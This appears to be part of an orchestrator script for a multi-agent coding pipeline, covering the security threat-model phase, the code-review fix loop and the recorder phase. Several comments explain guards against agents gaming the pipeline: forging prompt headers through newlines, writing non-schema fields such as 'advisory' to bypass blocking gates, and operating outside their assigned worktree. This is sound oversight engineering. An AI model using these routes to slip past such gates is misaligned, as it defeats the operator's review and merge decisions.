  const models = routeModels(plan.complexity)
  const CTX = renderContext(plan.codebase_context) + renderRecoveredCommands(droppedCommands)
  const surface = plan.security_surface || 'unrated'
  if (planFromResume && !plan.security_surface) {
    log(`${logPrefix}⚠ resumePlan carries no security_surface rating — no Planner ran to rate it, so the threat model is being forced on. Pass security:false to skip it deliberately.`)
  }
  const DO_SECURITY = securityEnabled(plan, planFromResume && !plan.security_surface)
  const WORKTREE_BLOCK = ctx.isMulti ? renderWorktree(plan.worktree_path, plan.branch, ctx.label) : ''

  log(`${logPrefix}Complexity: ${plan.complexity}  |  Security surface: ${surface}${planFromResume ? ' (recovered, not re-rated)' : ''}  |  Coder:${models.coder}  Reviewer:${models.reviewer}  Fix-review:${models.reviewerFix || models.reviewer}`)
  if (ctx.isMulti) log(`${logPrefix}Worktree: ${plan.worktree_path} (${plan.branch}) — verified by the Isolate phase`)
  if (surface !== 'none' && plan.security_notes?.length) {
    plan.security_notes.forEach(n => log(`${logPrefix}  ⚠ ${n}`))
  }
  // A task nobody can point to evidence for is the pipeline's blind spot: it builds
  // a plausible fix for a problem that may not exist, and every downstream agent
  // treats the premise as settled. Surface it here — the operator is the only one
  // who can tell "no evidence yet" apart from "no problem".
  if (plan.problem_evidence?.basis === 'asserted') {
    log(`${logPrefix}  ⚠ Premise unverified: nothing observed confirms this problem is real — the plan takes the task's word for it.`)
    if (plan.problem_evidence.confirms) log(`${logPrefix}    Would be confirmed by: ${plan.problem_evidence.confirms}`)
  }
  // The orchestrator derives this instead of trusting the brief it just sent.
  // Three field reports in this repo end the same way — fullSuiteAt was a label
  // no prompt carried, agents/planner.md said to carry contract wording forward
  // and nothing checked that it had, the worktree instruction was obeyed by a
  // Planner that never created one — so a prompt-level instruction with no
  // orchestrator-side reinforcement is a known losing shape here, not a
  // hypothetical one.
  capList((Array.isArray(plan.conflicts) ? plan.conflicts : []).filter(c => String(c ?? '').trim()).map(c => `⚠ Conflict to confirm: ${collapseLines(c)}`)).forEach(l => log(`${logPrefix}  ${l}`))
  if (reconciliationStatus(task, plan) === 'expected_not_reported') {
    log(`${logPrefix}  ⚠ Reconciliation expected but not reported: this task supplies an artifact (${artifactMarkers.join(', ')}) and the plan carries no conflicts entry — the artifact was either not reconciled against the project's contracts and the brief's own prose, or it was and the Planner did not say so.`)
  }
  log(`${logPrefix}Plan: ${plan.steps.length} step(s), ${plan.codebase_context?.relevant_files?.length || 0} files mapped`)
  plan.steps.forEach(s => log(`${logPrefix}  • ${s.what}`))
  if (!plan.sizing) {
    log(`${logPrefix}⚠ Planner returned no sizing block — size unrated for this run.`)
  } else if (plan.sizing.fits_one_run !== false) {
    log(`${logPrefix}Sizing: fits one run${plan.sizing.reason ? ` — ${plan.sizing.reason}` : ''}`)
  } else {
    log(`${logPrefix}Sizing: does NOT fit one run${plan.sizing.reason ? ` — ${plan.sizing.reason}` : ''}`)
    const chunks = plan.sizing.suggested_split || []
    chunks.forEach(c => log(`${logPrefix}  ⤷ [${c.label}] ${c.task.slice(0, 100)}${c.task.length > 100 ? '...' : ''}${c.depends_on?.length ? `  (after: ${c.depends_on.join(', ')})` : ''}`))
  }
  if (plan.migrations?.count > 0) {
    log(`${logPrefix}Migrations: ${plan.migrations.count} in ${plan.migrations.directory} — ${(plan.migrations.identifiers || []).join(', ') || '(no identifiers listed)'}`)
  }

  return { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK, scopedTests }
}

// ── phaseSecurity ──────────────────────────

async function phaseSecurity(plan, models, ctx, WORKTREE_BLOCK, CTX, DO_SECURITY, logStage, logPrefix) {
  let securityReport = null

  if (DO_SECURITY) {
    logStage('Security')

    const flagged = plan.security_notes?.length
      ? `\n\n## SURFACE THE PLANNER FLAGGED\n${plan.security_notes.map(n => `- ${n}`).join('\n')}\n\nStart from these, then look for what the Planner missed.`
      : ''

    securityReport = await runAgent(
      WORKTREE_BLOCK + CTX + `Threat-model this implementation plan. No code exists yet — identify risks before they are written.\n\n${renderPlan(plan)}${flagged}`,
      { label: ctx.isMulti ? `${ctx.label}:security` : 'security', phase: 'Security', model: models.security, agentType: 'security', schema: SECURITY_SCHEMA, stallMs: STALL_MS.security, ledger: ctx.ledger }
    )

    if (securityReport) {
      log(`${logPrefix}Security: ${securityReport.status} — ${securityReport.summary}`)
      securityReport.findings?.forEach(f => log(`${logPrefix}  [${f.severity}] ${f.category}: ${f.what}`))
    } else {
      log(`${logPrefix}⚠ Security returned nothing — proceeding without threat model.`)
    }
  }

  const SECURITY_BLOCK = renderSecurity(securityReport, plan)

  return { securityReport, SECURITY_BLOCK }
}

// ── phaseCodeReview ────────────────────────

async function phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix, scopedTests) {
  let iteration = 0
  // Sticky across passes: the question the result answers is whether the full
  // suite ran at any point in this run, not whether the last fix pass ran it.
  let fullSuiteRanOnce = false
  let reviewIssues = []
  let finalVerdict = null
  let lastVerdict = null
  let lastIssues = []
  // Issues sent to a fix pass that the next review did NOT re-raise — kept so
  // an exhausted run can say "these were closed, these remain" instead of
  // handing back an undifferentiated refusal the operator has to re-diff.
  const resolvedIssues = []
  // Distinct issues downgraded across the whole run, keyed by issueKey — the
  // canonicalized identity, not the Reviewer's verbatim prose, so casing or
  // whitespace variation cannot split one finding into two entries. A Set, not
  // a counter, so a pre-existing finding re-raised on every fix pass is still
  // one entry, not one per pass it survived. Used ONLY for the exhausted-run summary's distinct
  // count; it must never reach the report, because `finalVerdict.issues` is
  // always the LAST pass's issues and only the last pass's decision describes
  // them (see lastDowngraded below).
  const downgradedKeys = new Set()
  // The last completed pass's downgrade decision — key → the pass that made it.
  // This is what phaseRecord annotates from: an issue downgraded on pass 1 and
  // re-raised on pass 2 with `introduced_by_fix: true` is blocking now, and a
  // report built from the run-lifetime Set would label it advisory anyway.
  let lastDowngraded = new Map()
  // The last pass's Coder output, kept past the loop so phaseRecord can read the
  // two signals that outlive the review: what the run changed, and what rule it
  // had to settle for itself. Last pass, not first: a fix pass can touch files
  // the first one did not, and a contract candidate noticed while fixing is the
  // same finding as one noticed while building.
  let lastCoderResult = null
  // Run-lifetime count of issues sent to a fix pass that came back with no
  // outcome entry — surfaced in the result so "the loop ran out" and "the loop
  // ran out while nobody could say what each pass actually answered" are
  // distinguishable afterwards.
  let issuesUnaccounted = 0
  // The FIRST pass only: that is the pass that builds the environment, and a
  // later pass inherits whatever it built. Seeded from a null result so an
  // unreached loop reports 'unknown' rather than an invented literal.
  let envStatus = deriveEnvStatus(null)

  while (iteration < MAX_FIX_LOOPS) {
    const isFirstPass = iteration === 0

    logStage('Code')

    // Fix passes stay narrow — only the flagged files, not a re-review of the
    // whole surface — because re-attacking everything on every loop would
    // triple the cost of a multi-round fix for no proportional benefit.
    // Both branches, not only the first: a fix pass is a pass, and one that runs
    // the whole suite at the end costs exactly what the first one would and
    // defeats fullSuiteAt 'never' just as completely. The scoped block goes with
    // it because the directive tells the Coder to use "the scoped command" —
    // without the block naming it, that sentence points at nothing.
    const TESTS_BLOCK = (scopedTests?.block || '') + renderFullSuiteDirective(scopedTests?.fullSuiteAt, 'coder')

    const coderPrompt = isFirstPass
      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + TESTS_BLOCK + `Set up the environment, then execute this plan. The PROJECT CONTEXT above is your map — don't re-scan the repo.\n\n${renderPlan(plan)}`
      : WORKTREE_BLOCK + TESTS_BLOCK + `Fix the review issues below. The file list is a scope guard — it stops this pass from rewriting the world; it is not permission to hand an issue back unfixed. Every issue has exactly three permitted outcomes: fix it; fix it in a file outside the list because that is where the fix actually lives, and name that file in \`deviations\`; or report it blocked, with the reason. Silently returning an unfixed issue is not one of them. Every issue below owes an entry in \`issue_outcomes\` — the file, the issue text verbatim, and \`fixed\`, \`not_fixed\` or \`blocked\` with a reason in \`detail\`. Don't leave a comment narrating the fix ("changed X to Y because the reviewer flagged Z") — the why belongs in your summary, not in the code.\n\n## ISSUES\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}\n   → suggested fix (the Reviewer's hypothesis, not verified — check it against the code before applying): ${iss.suggestion}`).join('\n\n')}\n\nA suggestion contradicted by the code, or by the already-closed list below, means fix the issue a different way and say so in \`deviations\`. It never means there is nothing to do.${renderResolved(resolvedIssues)}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}`

    const coderLabel = isFirstPass ? 'coder' : `coder-fix-${iteration}`
    const coderResult = await runAgent(coderPrompt, {
      label: ctx.isMulti ? `${ctx.label}:${coderLabel}` : coderLabel,
      phase: 'Code',
      model: models.coder,
      agentType: 'coder',
      schema: CODER_SCHEMA,
      stallMs: STALL_MS.coder,
      ledger: ctx.ledger,
    })

    lastCoderResult = coderResult || lastCoderResult

    if (coderResult?.tests?.result) log(`${logPrefix}Coder pass ${iteration + 1}: ${coderResult.tests.result}`)
    else log(`${logPrefix}Coder pass ${iteration + 1} complete`)
    if (coderResult?.env?.unresolved?.length) log(`${logPrefix}  ⚠ Env: ${coderResult.env.unresolved.join('; ')}`)
    // Warning, not a gate — a suite too expensive to run twice is a real
    // situation, and an honest `captured: false` with a reason is the correct
    // answer there. This just makes the gap visible instead of silent.
    if (isFirstPass && !coderResult?.tests?.baseline?.captured) {
      log(`${logPrefix}⚠ No test baseline captured before the first edit — pre-existing failures are unattributable`)
    }
    if (isFirstPass) envStatus = deriveEnvStatus(coderResult)
    if (fullSuiteRan(coderResult?.tests)) {
      fullSuiteRanOnce = true
      // The command is logged, not just the fact: a scoped line reported as
      // the full suite is only visible if the journal carries what actually
      // ran, and comparing it against the plan's own test_command is
      // something the operator can do afterwards from this line alone.
      log(`${logPrefix}Full suite (pass ${iteration + 1}): \`${coderResult.tests.full_suite.command}\` — ${coderResult.tests.full_suite.result}`)
    } else if (coderResult?.tests?.full_suite?.ran === true) {
      log(`${logPrefix}⚠ Coder pass ${iteration + 1} reported the full suite as run but gave no command and/or no result — counting it as not run`)
    }

    // Logged loudly and handed to the Reviewer, but deliberately NOT a gate. A
    // Coder that fixed all three issues and forgot the JSON field would fail a
    // run whose code was correct — the same failure direction deriveEnvStatus
    // exists to stop — and an issue genuinely left unfixed keeps blocking on
    // the next review's own merits, which is a stronger test than a self-report
    // anyway. See accountIssueOutcomes for why its inverted fuzzy match makes
    // "warning only" the only safe use of this.
    let accountingBlock = ''
    if (!isFirstPass) {
      const { entries, unaccounted, notFixed } = accountIssueOutcomes(reviewIssues, coderResult)
      issuesUnaccounted += unaccounted.length
      unaccounted.forEach(iss => log(`${logPrefix}  ⚠ UNACCOUNTED [${iss.severity}] ${iss.file}: ${iss.what} — the fix pass returned no issue_outcomes entry for it`))
      notFixed.forEach(e => log(`${logPrefix}  ⚠ REPORTED ${e.outcome || 'no outcome'} ${e.file}: ${e.issue}${e.detail ? ` — ${e.detail}` : ''}`))
      accountingBlock = renderAccounting(entries, unaccounted)
    }

    logStage('Review')

    const scopedRevert = renderScopedRevert(plan, coderResult, scopedTests?.mode)
    if (scopedRevert.dropped.length) {
      log(`${logPrefix}  ⚠ ${scopedRevert.dropped.length} reported test path(s) excluded from the Reviewer's scoped command (unsupported characters): ${scopedRevert.dropped.join(', ')}`)
    }

    const REVIEW_TESTS_BLOCK = (scopedTests?.block || '') + renderFullSuiteDirective(scopedTests?.fullSuiteAt, 'reviewer')

    const reviewerPrompt = isFirstPass
      ? WORKTREE_BLOCK + CTX + SECURITY_BLOCK + REVIEW_TESTS_BLOCK + `Review this implementation against the plan, drive the app to prove the acceptance criteria, then try to break it.\n\n${renderPlan(plan)}\n\n## CODER'S SUMMARY\n${renderCoderSummary(coderResult)}${scopedRevert.block}`
      : WORKTREE_BLOCK + REVIEW_TESTS_BLOCK + `Verify these fixes landed, and scan for new problems introduced by them. Re-run every attack marked \`broke\` and every criterion marked \`failed\` or \`skipped\` in the block below; don't re-run the ones marked \`held\` or \`passed\` unless this fix plausibly touched them. Check the new code for archaeology comments too — a line explaining what the fix changed and why is history, not a constraint; flag it the same as dead code.\n\n## ISSUES TO VERIFY\n${reviewIssues.map((iss, i) => `${i + 1}. [${iss.severity}] ${iss.file}: ${iss.what}`).join('\n')}\n\n## CODER'S FIX SUMMARY\n${renderCoderSummary(coderResult)}${scopedRevert.block}\n\n## PLAN (context)\n${renderPlanCompact(plan)}${renderConstraints(plan)}${renderMigrations(plan)}${renderPriorVerification(lastVerdict, iteration)}${accountingBlock}`

    const reviewerLabel = isFirstPass ? 'reviewer' : `reviewer-${iteration}`
    // `|| models.reviewer` is defensive, not load-bearing: mergeModelTable
    // seeds every row from DEFAULT_MODELS, so reviewerFix is always set by the
    // time routeModels returns. Kept because dispatching a round with no model
    // is unrecoverable, and because the log line above computes the same
    // expression — the two must not disagree about which model ran.
    const reviewerModel = isFirstPass ? models.reviewer : (models.reviewerFix || models.reviewer)
    const rawVerdict = await agentWithModelFallback(reviewerPrompt, {
      label: ctx.isMulti ? `${ctx.label}:${reviewerLabel}` : reviewerLabel,
      phase: 'Review',
      model: reviewerModel,
      agentType: 'reviewer',
      schema: VERDICT_SCHEMA,
      stallMs: STALL_MS.reviewer,
      ledger: ctx.ledger,
    }, REVIEWER_FALLBACK[reviewerModel])

    if (!rawVerdict) {
      log(`${logPrefix}ERROR: Reviewer failed.`)
      return { error: 'Reviewer failed', plan, label: ctx.label, task }
    }

    // A `null` or non-object entry in the Reviewer's array used to abort the
    // whole feature on the first property access. Drop them here — before any
    // other stage touches the verdict — rather than guarding every read
    // downstream. This is the first thing done to a raw verdict for a reason:
    // downgradeUnrelatedFindings destructures every entry.
    {
      const raw = rawVerdict.issues || []
      const clean = raw.filter(i => i && typeof i === 'object')
      if (clean.length !== raw.length) {
        log(`${logPrefix}  ⚠ Dropped ${raw.length - clean.length} malformed issue entr(ies) from the verdict`)
      }
      rawVerdict.issues = clean
    }

    // Must run before enforceMigrationGate and enforceVerificationGate: each
    // gate injects a `critical` issue that is by construction neither on the
    // sent list nor marked introduced_by_fix, so downgrading it after the fact
    // would silently disable that gate.
    const { verdict: downgradedVerdict, downgraded: newlyDowngraded } = isFirstPass
      ? { verdict: rawVerdict, downgraded: new Map() }
      : downgradeUnrelatedFindings(rawVerdict, reviewIssues, iteration, Array.isArray(coderResult?.files_changed) ? coderResult.files_changed : [])
    lastDowngraded = newlyDowngraded
    if (newlyDowngraded.size) {
      (downgradedVerdict.issues || [])
        .filter(iss => newlyDowngraded.has(issueKey(iss)))
        .forEach(iss => {
          downgradedKeys.add(issueKey(iss))
          log(`${logPrefix}  ⚠ DOWNGRADED TO ADVISORY [was ${iss.severity}] ${iss.file}: ${iss.what} (new in fix pass ${newlyDowngraded.get(issueKey(iss))}, not marked introduced_by_fix)`)
        })
    }
    const verdict = enforceMigrationGate(downgradedVerdict, plan)
    if (verdict !== downgradedVerdict) {
      log(`${logPrefix}✗ Migration gate: ${verdict.migrations_check?.status || rawVerdict.migrations_check?.status || 'missing check'}`)
    } else if (plan.migrations?.count > 0 && verdict.migrations_check?.status === 'ok') {
      log(`${logPrefix}✓ Migration numbering verified: ${verdict.migrations_check.evidence || 'no collision, count matches'}`)
    }

    const gatedVerdict = enforceVerificationGate(verdict)
    // Object identity, the same unforgeable signal the migration gate uses
    // above: a boolean read off the verdict would be a field outside
    // VERDICT_SCHEMA, which a Reviewer is free to write in.
    const verificationBlocked = gatedVerdict !== verdict
    if (verificationBlocked) {
      log(`${logPrefix}✗ Verification gate: ${verdict.verification?.verdict || 'no verification block reported'}`)
    }

    // Destructive on a wrong tree: the revert-and-restore proof runs `git
    // checkout --` and `git apply` against whatever the Reviewer thinks is its
    // worktree. This is honesty-of-report (see verifyAgentLocation), not a
    // containment guarantee, but it catches the documented failure — a weak
    // model losing the prompt-only ISOLATION instruction — before the operator
    // finds their uncommitted work gone.
    if (verifyAgentLocation(verdict.worktree_root, plan, ctx)) {
      log(`${logPrefix}✗ REVIEWER OPERATED OUTSIDE ITS WORKTREE — expected ${plan.worktree_path}, reported ${verdict.worktree_root}`)
    } else if (ctx.isMulti && !verdict.worktree_root) {
      log(`${logPrefix}⚠ Reviewer did not report worktree_root — its location could not be verified`)
    }

    const v = verdict.verification
    if (v) {
      // Same Array.isArray guard as enforceVerificationGate above, and for the
      // same reason: these fields are model-authored and the schema does not
      // bind their runtime shape. `?.` is not enough — it only guards null, so
      // a string `criteria` reaches .filter and throws, and `blockers: 'none'`
      // has a truthy .length and throws on .join. Reached via the alias `v`,
      // which is why an enumeration grepping for `verification?.criteria`
      // could not see these. Entry access is null-safe too: a well-formed
      // array can still hold a null element.
      const crit = Array.isArray(v.criteria) ? v.criteria : []
      const blockers = Array.isArray(v.blockers) ? v.blockers : []
      const passed = crit.filter(c => c?.status === 'passed').length
      const total = crit.length
      log(`${logPrefix}Verification: ${v.verdict}${total ? ` — ${passed}/${total} criteria proven` : ''}`)
      crit.filter(c => c?.status !== 'passed').forEach(c => {
        const mark = c?.status === 'failed' ? '✗' : '○' // skipped/other
        log(`${logPrefix}  ${mark} ${c?.criterion}${c?.note ? ` — ${c.note}` : ''}`)
      })
      if (blockers.length) log(`${logPrefix}  ⚠ Blockers: ${blockers.join('; ')}`)
    }

    // An empty attack list on a runnable change means the Reviewer only
    // checked the happy path — worth surfacing, not just silently absent.
    const atk = Array.isArray(verdict.attacks) ? verdict.attacks : []
    if (atk.length) {
      const broke = atk.filter(a => a?.outcome === 'broke')
      log(`${logPrefix}Attacks: ${atk.length} tried, ${broke.length} broke it`)
      broke.forEach(a => log(`${logPrefix}  ✗ ${a?.vector}`))
    }

    lastVerdict = gatedVerdict
    lastIssues = gatedVerdict.issues || []

    // Anything we sent to this pass that the review didn't re-raise is closed.
    // Fuzzy (matchIssueKey): the question is whether the Reviewer is describing
    // a defect it already described, and the safe answer is "yes, still open" —
    // an issue re-raised in different words must not be reported as closed.
    if (reviewIssues.length) {
      const stillOpen = new Set(lastIssues.map(issueKey))
      reviewIssues.forEach(prev => {
        if (matchIssueKey(prev, stillOpen) === null) resolvedIssues.push({ ...prev, resolved_in_pass: iteration + 1 })
      })
    }

    if (gatedVerdict.status === 'approved') {
      finalVerdict = markUnproven(gatedVerdict)
      log(`${logPrefix}✓ APPROVED — ${gatedVerdict.summary}`)
      logUnproven(finalVerdict, logPrefix)
      break
    }

    // A downgraded issue keeps its original severity but no longer counts as
    // blocking — see downgradeUnrelatedFindings above. The test trusts
    // `newlyDowngraded`, this pass's own decision, never the `advisory` field
    // on the issue itself (that field arrives on the Reviewer's own verdict
    // JSON and is not part of VERDICT_SCHEMA, so nothing stops a Reviewer from
    // writing it in to bypass the loop) and never the run-lifetime
    // `downgradedKeys` Set — a downgrade decided on one pass must not bind a
    // later pass where the Reviewer re-raises the same finding with
    // `introduced_by_fix: true`.
    // Exact, unlike the fuzzy sentKeys membership in downgradeUnrelatedFindings:
    // this asks what the orchestrator decided about these very objects on this
    // very pass, so a near hit would widen the downgrade set and REDUCE what
    // blocks — the unsafe direction.
    const isBlocking = i => BLOCKING_SEVERITIES.includes(i.severity) && !newlyDowngraded.has(issueKey(i))
    const blocking = lastIssues.filter(isBlocking)
    const advisory = lastIssues.filter(i => !isBlocking(i))

    log(`${logPrefix}✗ ${lastIssues.length} issue(s): ${blocking.length} blocking, ${advisory.length} advisory`)
    lastIssues.forEach(iss => log(`${logPrefix}  [${iss.severity}] ${iss.file}: ${iss.what}`))

    // `verificationBlocked` is tested alongside the injected issue, not instead
    // of it. resolveBlockingSeverities now forces 'critical' back into
    // BLOCKING_SEVERITIES whatever config.blockingSeverities says, so the gate's
    // own injected issue can no longer fall out of `blocking` — but this second
    // test costs nothing and does not depend on that guarantee holding, which is
    // the property worth keeping for a gate whose failure direction is a green
    // run over an unproven criterion.
    if (blocking.length === 0 && !verificationBlocked) {
      finalVerdict = markUnproven({ ...gatedVerdict, status: 'approved', summary: `${gatedVerdict.summary} (${advisory.length} advisory issue(s) left unfixed)` })
      log(`${logPrefix}✓ APPROVED — no blocking issues remain`)
      logUnproven(finalVerdict, logPrefix)
      break
    }

    reviewIssues = blocking
    iteration++
  }

  if (!finalVerdict) {
    log(`${logPrefix}⚠ Max fix loops (${MAX_FIX_LOOPS}) exhausted.`)
    if (resolvedIssues.length) {
      log(`${logPrefix}  Closed across the run (${resolvedIssues.length}):`)
      resolvedIssues.forEach(iss => log(`${logPrefix}    ✓ [${iss.severity}] ${iss.file}: ${iss.what} (pass ${iss.resolved_in_pass})`))
    }
    log(`${logPrefix}  Still open (${lastIssues.length}):`)
    lastIssues.forEach(iss => log(`${logPrefix}    ✗ [${iss.severity}] ${iss.file}: ${iss.what}`))
    finalVerdict = markUnproven({
      status: 'changes_requested',
      summary: `Max ${MAX_FIX_LOOPS} fix iterations reached. ${resolvedIssues.length} issue(s) were closed along the way; the 'issues' list holds only what's still open — often small enough to fix by hand rather than re-running the pipeline.${downgradedKeys.size ? ` ${downgradedKeys.size} issue(s) were downgraded to advisory along the way (new in a fix pass, not attributed to it).` : ''}`,
      issues: lastIssues,
      resolved_issues: resolvedIssues,
      // Carried from the last real verdict — the Recorder's VERIFICATION and
      // ATTACKS sections read straight off this object, and an exhausted run
      // still has three rounds of falsification evidence worth writing down.
      verification: lastVerdict?.verification,
      attacks: lastVerdict?.attacks,
      // Explicit rather than inferred from resolved_issues' presence — see
      // phaseRecord, which branches its prompt on this flag rather than
      // guessing the run's outcome from what else happens to be on the verdict.
      loops_exhausted: true,
    })
    logUnproven(finalVerdict, logPrefix)
  }

  return { finalVerdict, iteration, downgraded: lastDowngraded, fullSuiteRan: fullSuiteRanOnce, issuesUnaccounted, envStatus,
    filesChanged: Array.isArray(lastCoderResult?.files_changed) ? lastCoderResult.files_changed : [],
    deviations: Array.isArray(lastCoderResult?.deviations) ? lastCoderResult.deviations : [] }
}

// ── phaseRecord ────────────────────────────

// The Recorder runs on the cheapest model in the pipeline, and a prompt
// instruction with no reinforcement loses on it — the field-report symptom was a
// review report landing in the main checkout mid-run and getting swept into a
// neighbouring feature's commit, with nothing catching it until merge. This
// checks what the Recorder itself reported, using the same honesty-of-report
// comparison as the Reviewer's location check (see verifyAgentLocation above),
// plus a stricter rule specific to what it writes: a reported path must never be
// absolute or contain a `..` segment, regardless of which worktree it claims.
function verifyRecordLocation(recordResult, plan, ctx) {
  if (!ctx?.isMulti) return false
  if (verifyAgentLocation(recordResult.worktree_root, plan, ctx)) return true
  return (recordResult.files_written || []).some(f => {
    const path = String(f || '')
    return path.startsWith('/') || path.split('/').includes('..')
  })
}

// A formatting agent writes these files rather than the workflow
// script itself, because the script has no filesystem access — only agents
// it spawns can read/write, so persisting anything to disk has to go through
// an agent call even when the "work" is just rendering already-known data.
async function phaseRecord(approved, plan, finalVerdict, securityReport, task, ctx, WORKTREE_BLOCK, models, logStage, logPrefix, downgraded, coderSignals) {
  // Collected and logged ABOVE the early return: see collectRunSignals for what
  // being below it cost. Logged as well as rendered on the path that does reach
  // the Recorder, because a Recorder that dies loses the prompt but not the run
  // log.
  const { contractCandidates, designDrift } = collectRunSignals(DESIGN_MAP, coderSignals, finalVerdict)
  contractCandidates.forEach(c => log(`${logPrefix}⚠ ${c}`))
  designDrift.forEach(d => log(`${logPrefix}⚠ Design doc drift: ${collapseLines(d.doc)} was not touched while ${d.matched.length} file(s) matching \`${collapseLines(d.glob)}\` changed`))

  if ((!approved && finalVerdict.loops_exhausted !== true) || plan.complexity === 'trivial') {
    // Which condition skipped the phase is named rather than left to be
    // inferred: the two mean opposite things to an operator reading the log, and
    // a signal with no destination is worth less than one that says where it
    // did not go. No logStage('Record') and no Recorder on this path — a
    // trivial run must not grow a phase just to log a line.
    if (contractCandidates.length || designDrift.length) {
      const why = plan.complexity === 'trivial'
        ? "the run is rated 'trivial'"
        : 'the work was not approved and the fix loop did not exhaust'
      log(`${logPrefix}  ↑ logged only — ${why}, so this run has no Record phase and nothing above was written as a backlog item.`)
    }
    return { recordMisplaced: false, recordStatus: 'skipped' }
  }

  logStage('Record')

  // The never-approved field case left no artifact at all — three rounds of
  // falsification evidence, criteria proven and attacks run, none of it
  // written down — and the operator had to read raw verdicts to decide the
  // work was mergeable, which is exactly the decision this pass exists to
  // hand them. But the run isn't final, so unlike the approved path this must
  // not touch the architecture doc: it must not describe something that may
  // never land.
  const notApproved = !approved
  const opening = notApproved
    ? `Persist this run's results to the repo. The fix loop was exhausted before the work was approved. Write the review report with full evidence, marked NOT APPROVED, and create backlog items for the issues still open. Skip the architecture-map step entirely — the change is not final and that map must not describe something that may never land.`
    : `Persist this run's results to the repo. Write the review report with full evidence, update the architecture doc, and create backlog items for anything unfixed.`

  // One issue is always one line: model-authored text is newline-collapsed so
  // it cannot forge a `## SECTION` header in the prompt below. No truncation —
  // this is the evidence the report is built from, unlike the capped claims
  // quoted into a fix-pass prompt (see collapseLines). Same LINE_BREAK_RUN
  // class, because a `\r` forges a header here exactly as a `\n` does.
  const oneLine = x => String(x ?? '').replace(LINE_BREAK_RUN, ' ')

  // The summary is collapsed for the same reason the issue lines below it are.
  // It reads as orchestrator-composed, but markUnproven, markFullSuite and
  // markEnvUnreproducible all append model-authored criterion and environment
  // text to it, so it carries free text into this prompt by the same route.
  const verdictLine = notApproved
    ? `${finalVerdict.status.toUpperCase()} — NOT APPROVED — max fix iterations reached — ${oneLine(finalVerdict.summary)}`
    : `${finalVerdict.status.toUpperCase()} — ${oneLine(finalVerdict.summary)}`

  // A downgraded issue keeps its original severity so the rating survives into
  // the report, but the report must say so — otherwise a downgraded `critical`
  // reads identically to one still holding the loop. Every part of the
  // annotation is composed here from `downgraded`, the orchestrator's own Map
  // of what the LAST pass downgraded. Nothing is read off the issue object:
  // `advisory` and `downgrade_reason` are not in VERDICT_SCHEMA, so a Reviewer
  // can write whatever it likes there, and this text lands verbatim in a
  // persisted report an operator reads to decide whether to merge. The Map is
  // the last pass's, not the run's, because `finalVerdict.issues` is the last
  // pass's issues — a key downgraded on pass 1 and re-raised as blocking on
  // pass 2 must not read as advisory here.
  const renderIssue = iss => {
    // issueKey canonicalizes on insert and on lookup alike, so a newline or a
    // casing difference in the Reviewer's prose can no longer split one entry
    // into two. Exact, never fuzzy: the Map records the orchestrator's decision
    // about these exact objects, and a near hit would print "advisory" beside an
    // issue that is still holding the loop, in a persisted report an operator
    // reads to decide whether to merge.
    const pass = downgraded.get(issueKey(iss))
    const note = pass === undefined ? '' : ` (advisory — new in fix pass ${pass}, not attributed to it)`
    return `[${oneLine(iss.severity)}] ${oneLine(iss.file)}: ${oneLine(iss.what)}${note} → ${oneLine(iss.suggestion)}`
  }

  const issuesBlock = notApproved
    ? `## ISSUES STILL OPEN
${(finalVerdict.issues || []).map(renderIssue).join('; ') || 'none'}

## ISSUES CLOSED ALONG THE WAY
${(finalVerdict.resolved_issues || []).map(iss => `[${oneLine(iss.severity)}] ${oneLine(iss.file)}: ${oneLine(iss.what)} (closed in pass ${oneLine(iss.resolved_in_pass)})`).join('\n') || 'none'}`
    : `## ISSUES
All: ${(finalVerdict.issues || []).map(renderIssue).join('; ') || 'none'}`

  // Both proposal channels feed one list: a rule the Coder had to invent and a
  // rule the Reviewer noticed missing are the same finding, and the operator
  // should see them once. Composed from the values collected above the early
  // return, so this prompt is byte-identical to what it was when the collection
  // lived here.
  const contractCandidatesBlock = renderContractCandidates(contractCandidates)
  const designDriftBlock = renderDesignDrift(designDrift)

  // Sampled here rather than handed in, because this block has to be composed
  // before the Recorder runs and therefore structurally cannot contain the
  // Recorder's own output — renderCost says so in the block itself. The ledger
  // keeps running: runOneFeature samples it again after this phase returns, and
  // that later figure, which does include the Record phase, is the one the run
  // log and the result carry.
  const cost = ctx.ledger ? ctx.ledger.finish() : null

  const recordPrompt = WORKTREE_BLOCK + renderBacklogDirective(BACKLOG_DESTINATION) + `${opening}

## TASK
${task}

## PLAN
${renderPlan(plan)}

## VERDICT
${verdictLine}

## VERIFICATION
${(Array.isArray(finalVerdict.verification?.criteria) ? finalVerdict.verification.criteria : []).map((c, i) => `${i + 1}. [${c?.status}] ${c?.criterion}\n   Evidence: ${c?.evidence || '(none)'}`).join('\n')}

## ATTACKS
${(Array.isArray(finalVerdict.attacks) ? finalVerdict.attacks : []).map((a, i) => `${i + 1}. [${a?.outcome}] ${a?.vector}\n   Evidence: ${a?.evidence || '(none)'}`).join('\n')}

${issuesBlock}

## SECURITY (if any)
${securityReport?.status === 'findings' ? securityReport.findings.map(f => `[${f.severity}] ${f.category}: ${f.what} → ${f.mitigation}`).join('\n') : 'none'}` + contractCandidatesBlock + designDriftBlock + renderCost(cost)

  const recordResult = await runAgent(recordPrompt, {
    label: ctx.isMulti ? `${ctx.label}:recorder` : 'recorder',
    phase: 'Record',
    model: models.recorder || 'sonnet',
    agentType: 'recorder',
    schema: RECORD_SCHEMA,
    stallMs: STALL_MS.recorder,
    ledger: ctx.ledger,
  })

  if (!recordResult) {
    // Named per artifact, not as "artifacts": the review report and the
    // architecture doc are the expensive losses and neither is about the
    // backlog, so an operator reading only "Record failed" has no way to know
    // the run's evidence went with it. The verdict line is here because the
    // two are unrelated — a dead Recorder is not a rejection.
    log(`${logPrefix}⚠ Recorder returned nothing — the review report, architecture doc and backlog were NOT written. The run's verdict above stands; only the persisted artifacts are missing.`)
    return { recordMisplaced: false, recordStatus: 'failed' }
  }

  const files = recordResult.files_written || []
  log(`${logPrefix}Record: wrote ${files.join(', ') || '(nothing reported)'}${recordResult.backlog?.destination ? ` — backlog → ${recordResult.backlog.destination}` : ''}`)

  // The directive above permits exactly one destination, so a Recorder
  // reporting the other one either ignored it or reached a service the
  // operator did not opt into. Non-blocking — the artifacts exist and the
  // verdict is unaffected — but it is the only signal that something was
